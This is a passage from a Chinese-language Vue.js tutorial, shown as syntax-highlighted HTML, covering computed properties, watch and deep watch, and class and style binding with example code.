class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id =<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    姓&lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;firstName&quot;</span>/&gt; <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">    名&lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;lastName&quot;</span>/&gt; <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">    姓名:<span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span> <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">    姓名:<span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span> <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">    姓名:<span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span> <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">    姓名:<span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span> <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">firstName</span>:<span class="string">&#x27;c&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">lastName</span>:<span class="string">&#x27;ez&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">computed</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">fullName</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="comment">//get的作用:当有人读取fullName时,get会被调用,且返回值就作为fullName的值</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="comment">//get中的this指向调整为vm对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="comment">//get什么时候会被调用:1.初次读取fullName时 2.所依赖的数据发生变化时</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(<span class="string">&#x27;get被调用&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="comment">//当fullName被修改时调用set方法</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(<span class="string">&#x27;set&#x27;</span>+value);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">const</span> arr = value.split(<span class="string">&#x27;-&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">this</span>.firstName = arr[<span class="number">0</span>]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">this</span>.lastName = arr[<span class="number">1</span>]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>计算属性简写</li></ul><p>只使用读取，不考虑修改时才可这样使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id =<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    姓&lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;firstName&quot;</span>/&gt; <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">    名&lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;lastName&quot;</span>/&gt; <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">    姓名:<span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span> <span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">firstName</span>:<span class="string">&#x27;c&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">lastName</span>:<span class="string">&#x27;ez&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">computed</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="function"><span class="title">fullName</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">console</span>.log(<span class="string">&#x27;get被调用&#x27;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="监视属性"><a href="#监视属性" class="headerlink" title="监视属性"></a>监视属性</h2><p>监视属性watch：</p><ul><li>当被监视的属性变化时，回调函数自动调用，进行相关操作</li><li>监视的属性必须存在，才能进行监视</li><li>监视的两种写法<ul><li>new Vue时传入watch配置</li><li>通过vm.$watch监视</li></ul></li></ul><h3 id="浅监视"><a href="#浅监视" class="headerlink" title="浅监视"></a>浅监视</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id =<span class="string">&quot;app&quot;</span>&gt; </span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;isHot=!isHot&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">isHot</span>:<span class="literal">true</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">computed</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">return</span> <span class="built_in">this</span>.isHot?<span class="string">&#x27;炎热&#x27;</span>:<span class="string">&#x27;凉爽&#x27;</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">watch</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="comment">//方式一</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">isHot</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="comment">//初始化时让handler调用以下</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">immediate</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="comment">//当isHot发生改变时调用handler方法</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(<span class="string">&quot;new:&quot;</span>+newValue+<span class="string">&#x27;----&#x27;</span>+<span class="string">&quot;old:&quot;</span>+oldValue)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="comment">//计算属性也可以被监视</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">info</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="comment">//初始化时让handler调用以下</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">immediate</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="comment">//当isHot发生改变时调用handler方法</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(<span class="string">&quot;new:&quot;</span>+newValue+<span class="string">&#x27;----&#x27;</span>+<span class="string">&quot;old:&quot;</span>+oldValue)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,  </span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="comment">//方式二</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    vm.$watch(<span class="string">&#x27;isHot&#x27;</span>,&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">//初始化时让handler调用以下</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">immediate</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">//当isHot发生改变时调用handler方法</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="built_in">console</span>.log(<span class="string">&quot;new:&quot;</span>+newValue+<span class="string">&#x27;----&#x27;</span>+<span class="string">&quot;old:&quot;</span>+oldValue)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="深度监视"><a href="#深度监视" class="headerlink" title="深度监视"></a>深度监视</h3><p>有多层数据结构的是时候就要采用深度监视</p><ul><li>Vue中的watch默认不监测对象内部值的改变(一层)</li><li>配置deep:true可以监测对象内部值的改变(多层)<ul><li>如果不配置deep:true，遇到对象时，虽然内部值变化了，但是外部对象的地址并没有发生变化，所以不会触发handler</li></ul></li><li>Vue自身可以监测对象内部值的改变，但Vue提供的watch不可以</li><li>使用watch时根据数据的具体结构，决定是否采用深度监视</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id =<span class="string">&quot;app&quot;</span>&gt; </span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>a的值是:&#123;&#123;numbers.a&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.a++&quot;</span>&gt;</span>点我让a+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>b的值是:&#123;&#123;numbers.b&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.b++&quot;</span>&gt;</span>点我让a+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">numbers</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">a</span>:<span class="number">1</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">b</span>:<span class="number">1</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">watch</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="comment">//监视多级结构中某个属性的变化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="string">&#x27;numbers.a&#x27;</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="function"><span class="title">handler</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(<span class="string">&#x27;a改变了&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="comment">//监视多级结构中所有属性的变化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">numbers</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">deep</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">immediate</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(<span class="string">&quot;new:&quot;</span>+newValue+<span class="string">&#x27;----&#x27;</span>+<span class="string">&quot;old:&quot;</span>+oldValue)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,  </span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>监视的简写形式</p><ul><li>当只需要handler，而不配置immediate和deep时，可以使用简写</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line"><span class="comment">//简写</span></span><br><span class="line">isHot(newValue,oldValue)&#123;</span><br><span class="line">console.log(<span class="string">&quot;new:&quot;</span>+newValue+<span class="string">&#x27;----&#x27;</span>+<span class="string">&quot;old:&quot;</span>+oldValue)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简写  第二个参数不需要传配置对象，只需要传一个函数(注意不要用箭头函数)，该函数就相当于handler</span></span><br><span class="line">vm.$watch(<span class="string">&#x27;isHot&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">&quot;new:&quot;</span>+newValue+<span class="string">&#x27;----&#x27;</span>+<span class="string">&quot;old:&quot;</span>+oldValue);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="watch对比computed"><a href="#watch对比computed" class="headerlink" title="watch对比computed"></a>watch对比computed</h3><ul><li>computed和watch之间的区别：<ul><li>computed能完成的功能，watch都可以完成</li><li>watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作</li></ul></li><li>两个重要的小原则：<ul><li>所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象</li><li>所有不被Vue所管理的函数(定时器的回调函数，ajax的回调函数，Promise的回调函数等)，最好写成箭头函数，这样this的指向才是vm或组件实例对象(箭头函数没有this，需要向上找，这样就会找到vm或组件实例对象了，如果写普通函数，则它的this就是window了)</li></ul></li></ul><blockquote><p>computed不能写异步动作, 但是watch可以</p></blockquote><h2 id="Class-与-Style-绑定"><a href="#Class-与-Style-绑定" class="headerlink" title="Class 与 Style 绑定"></a>Class 与 Style 绑定</h2><h3 id="绑定class样式"><a href="#绑定class样式" class="headerlink" title="绑定class样式"></a>绑定class样式</h3><p>操作元素的 class 列表和内联样式是数据绑定的一个常见需求。因为它们都是 attribute，所以我们可以用 <code>v-bind</code> 处理它们：只需要通过表达式计算出字符串结果即可。不过，字符串拼接麻烦且易错。因此，在将 <code>v-bind</code> 用于 <code>class</code> 和 <code>style</code> 时，Vue.js 做了专门的增强。表达式结果的类型除了字符串之外，还可以是对象或数组。</p><p>我们可以传给 <code>v-bind:class</code> 一个对象，以动态地切换 class：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;&#123; active: isActive &#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的语法表示 <code>active</code> 这个 class 存在与否将取决于数据 property <code>isActive</code> 的 truthiness。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 绑定class样式 字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;mood&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 绑定class样式 数组写法，适用于：要绑定样式的个数和名字均不确定 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 绑定class样式 对象写法，适用于：要绑定样式的个数和名字均确定,但是要动态决定是否使用 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>:<span class="string">&#x27;cez&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">mood</span>:<span class="string">&#x27;normal&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">classArr</span>:[<span class="string">&#x27;ys1&#x27;</span>,<span class="string">&#x27;ys2&#x27;</span>,<span class="string">&#x27;ys3&#x27;</span>],</span></span><br><span class="line"><span class="javascript">            <span class="attr">classObj</span>:&#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">lxz1</span>:<span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">lxz2</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">changeMood</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> arr = [<span class="string">&#x27;happy&#x27;</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="string">&#x27;normal&#x27;</span>]</span></span><br><span class="line"><span class="javascript">                <span class="keyword">const</span> index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">3</span>)  <span class="comment">//Math.floor向下取整</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.mood = arr[index];</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="绑定style样式"><a href="#绑定style样式" class="headerlink" title="绑定style样式"></a>绑定style样式</h3><ul><li>style样式：<ul><li><code>:style=&quot;&#123;fontSize:xxx&#125;&quot;</code>，其中xxx是动态值</li><li><code>:style=&quot;&#123;a,b&#125;&quot;</code>，其中a,b是样式对象</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 